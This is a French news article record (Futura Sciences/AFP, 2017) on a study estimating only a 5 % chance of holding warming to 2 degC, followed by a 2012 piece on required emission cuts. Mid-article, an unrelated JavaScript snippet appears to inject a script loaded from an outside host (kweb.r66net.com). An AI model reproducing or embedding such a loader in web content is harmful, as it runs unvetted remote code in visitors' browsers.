{"title": "Rechauffement climatique : 5 % de chances de le limiter a 2 degC", "newspaper": "Futura Sciences", "author": ["PARIS-AFP"], "date_publi": "2017-08-02", "content": "Des chercheurs estiment que nos chances de limiter le rechauffement climatique a 2 degC ne sont que de 5 %. Au regard de notre consommation actuelle d'energies fossiles et de la croissance de la population mondiale pour les prochaines decennies, il semble que nous nous dirigions vers un rechauffement global a 3,2 degC. Ce qu'il faut retenir Il n'y aurait que 5 % de chances de limiter le rechauffement climatique a 2 degC, comme l'a fixe l'accord de Paris. Les chances sont encore plus reduites (1 %) pour une limitation a 1,5 degC. L'augmentation de la temperature mondiale sera  << probablement de 2 a 4,9 degC, avec une valeur mediane de 3,2 degC >> , selon des chercheurs. Leurs calculs ne sont pas bases sur le pire scenario, avec une consommation d'energie toujours aussi intense. Ils integrent au contraire des efforts pour limiter l'utilisation des energies fossiles. Selon des chercheurs, il y a 5 % de chances de limiter le  rechauffement climatique  a 2 degC, l'objectif fixe par l'accord de Paris, scelle par la communaute internationale fin 2015. Quant aux chances d'atteindre l'objectif de 1,5 degC, egalement contenu dans l'accord, elles ne sont, elles, que de 1 %, estiment les auteurs de l'etude publiee lundi 31 juillet dans la revue  Nature Climate Change . Une equipe de scientifiques basee aux Etats-Unis a utilise des projections de croissance de la population pour estimer la production future et les  emissions  de  carbone  ( gaz a effet de serre ) dues a l'utilisation d' energies fossiles  qu'elle entraine. Sur la  base de ces donnees ,  << l'augmentation de la temperature est probablement de 2 a 4,9 degC, avec une valeur mediane de 3,2 degC et 5 % de chances qu'elle soit inferieure a 2 degC >> , ecrivent les chercheurs. Voir aussi : Accord de Paris : pourquoi il faut reduire les emissions de gaz a effet de serre Leurs calculs ne sont pourtant pas bases sur le pire scenario, avec une consommation d'energie toujours aussi intense, mais integrent des efforts pour limiter l'utilisation des energies fossiles, precisent-ils. Ils ne prevoient pas en revanche la possibilite d'un basculement massif et soudain vers les  energies renouvelables .  << Atteindre l'objectif d'un rechauffement inferieur a 1,5 degC suppose que l'intensite en carbone baisse bien plus vite que dans le passe recent >> , expliquent les chercheurs. Le Giec recommande de reduire de 40 a 70 % les emissions de gaz a effet de serre provenant des energies fossiles d'ici 2050 par rapport a leur niveau de 2010. (c) vlad61_61, Fotolia                               L'accord de Paris sera difficile a tenir Dans l'accord de Paris, la communaute internationale s'est engagee a limiter la hausse de la temperature mondiale  << bien en deca de 2 degC >>  et a  << poursuivre les efforts pour limiter la hausse a 1,5 degC >> , par rapport au niveau d'avant la Revolution industrielle afin d'eviter les consequences devastatrices du  changement climatique  ( canicules ,  secheresses , hausse du niveau des oceans,  tempetes ,  inondations , perte de la  biodiversite , etc.). Les experts ont averti depuis longtemps que meme l'objectif des 2 degC serait difficile a atteindre.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Voir aussi : Top 20 des especes menacees par le rechauffement climatique et l'Homme Le  Giec , le groupe d'experts internationaux dont les travaux font reference sur le  climat , recommande de reduire de 40 a 70 % les  emissions de gaz a effet de serre  provenant des energies fossiles d'ici 2050 par rapport a leur niveau de 2010. L'accord de Paris est moins precis, ses signataires se fixant pour objectif que les emissions atteignent leur pic  << des que possible >> . Selon les Nations unies, la population mondiale va grimper d'environ 7,5 milliards de personnes actuellement a 11,2 milliards d'ici 2100, augmentant encore la pression sur les ressources energetiques. Pour en savoir plus Ce qu'il faut faire d'ici 2020 pour limiter le rechauffement a 2 degC Article de Delphine Bossy publie le 19 decembre 2012 Si aucune mesure n'est prise d'ici 2020, il sera presque impossible de ne pas franchir la limite critique d'un rechauffement de 2 degC en 2100. D'apres une etude de faisabilite d'emissions de carbone, la consommation energetique mondiale ne doit pas depasser 55 milliards de tonnes d'equivalent carbone d'ici 2020...  Il y a moins d'un mois, la  Banque mondiale  publiait un rapport alarmiste qui prevoit pour 2100 au mieux une augmentation de la temperature atmospherique moyenne de 4 degC, au lieu des 2 degC des scenarios les plus optimistes. En decembre 2012, la  conference climatique de l'ONU  se tenait au Qatar. Si elle a donne une seconde vie au  protocole de Kyoto , aucune decision a l'echelle mondiale n'a ete prise. Mais dans un tel contexte de changement climatique, si des actions ne sont pas entreprises rapidement, limiter le  rechauffement climatique  deviendra beaucoup plus difficile a realiser, et probablement trop cher. Face a l'urgence du probleme, des membres du  National Center for Atmospheric Research  ( NCAR , Etats-Unis), associes aux chercheurs de l'International Institute for Applied Systems Analysis (IIASA, Vienne) et de l'ecole polytechnique federale de Zurich, ont realise une etude de faisabilite sur les  emissions de carbone  d'ici 2020. A l'echelle mondiale, il est imperatif de reduire les emissions : mais concretement, de combien ? L'equipe internationale a evalue les changements technologiques, politiques et sociaux necessaires pour maintenir l'augmentation moyenne de temperature sous les 2 degC pour le siecle prochain. C'est la premiere etude qui quantifie de maniere exhaustive les couts et les risques des emissions de gaz a effet de serre a partir du seuil critique de 2020. Pour determiner le seuil limite d'emission de carbone que le monde peut atteindre, les scientifiques ont developpe plusieurs scenarios et les projections ont fourni une fourchette d'estimations. Menee par Joeri Rogelj, l'etude montre que la limite des 2 degC pourrait toujours etre respectee, meme si les emissions de gaz a effet de serre n'etaient pas reduites d'ici 2020. Toutefois, la recette n'est pas simple : le prix serait tres eleve, il y aurait de plus gros  risques climatiques  sur le long terme et les hypotheses sur les technologies du futur sont franchement optimistes. Les principaux pays emetteurs de CO 2  en 2009. Ce sont en priorite ces pays qui doivent reconsiderer leur demande energetique. La Chine et les Etats-Unis sont les plus gros consommateurs. (c) Ide                               Agir vite pour limiter le rechauffement climatique a 2 degC Les projections sont basees sur l'engagement actuel des nations sur les emissions de carbone. Si rien ne change, les emissions mondiales atteindraient au minimum 55 milliards de tonnes d'equivalent carbone par an pour 2020, contre 50 milliards de tonnes par an aujourd'hui. Pourtant, meme avec ce taux d'emissions, il serait possible d'atteindre l'objectif des 2 degC. Neanmoins, une bonne dose d'optimisme est necessaire. Par exemple, il faudrait que le nucleaire perdure comme option d'attenuation, que certaines nations adoptent rapidement des strategies de technologiques de pointe, y compris les  vehicules electriques , et des technologies a haut rendement energetique pour les appareils electriques, les batiments et le transport.  En outre, il faudrait rapidement fermer les centrales electriques au  charbon  et les remplacer par d'autres sources d'energie.  << Vous aurez besoin d'arreter une centrale a charbon par semaine pendant dix ans si vous voulez atteindre l'objectif des 2 degC >> , explique  Keywan Riahi  de l'IIASA, coauteur de la publication. Pourtant, d'apres le dernier rapport de l'AIE (Agence internationale de l'energie), le charbon deviendra en 2017 la principale source d'energie. Plus les emissions sont reduites rapidement, plus nombreuses seront les options envisageables sur le long terme et moins cela coutera cher. Pour garder le plus de  portes  ouvertes, il faudrait arriver a un niveau d'emissions mondiales entre 41 et 47 milliards de tonnes d'equivalent carbone par an d'ici 2020. D'apres l'etude publiee dans le magazine  Nature Climate Change , le seul moyen pour atteindre l'objectif d'une augmentation de seulement 2 degC d'ici 2100 est de maintenir le taux d'emissions entre 41 et 55 milliards de tonnes par an d'ici 2020. Et encore, meme la limite superieure est tres hypothetique.   Reduire les emissions de 3 milliards de tonnes par an d'ici 2020 Brian O'Neill, l'un des coauteurs, explique :  << dans certaines conditions, l'objectif des 2 degC est possible, meme si nous ne reduisons pas les emissions d'ici 2020. Mais si nous prenons en compte la possibilite que certaines technologies ne perceront pas, seront trop couteuses ou auront des consequences indesirables, alors les  reductions d'emissions  doivent commencer cette decennie >>. En reduisant les emissions des maintenant dans les scenarios, mais surtout en reduisant la demande energetique, les chercheurs mettent en evidence qu'il est beaucoup plus facile d'atteindre la limite de rechauffement de 2 degC. Cela procurerait beaucoup plus de souplesse dans le choix des methodes et les technologies de  reduction des gaz a effet de serre  a employer sur le long terme. L'etude souligne l'importance de reduire la demande energetique et d'ameliorer l'efficacite energetique pour attenuer le changement climatique de cette decennie. ", "theme": "planete"}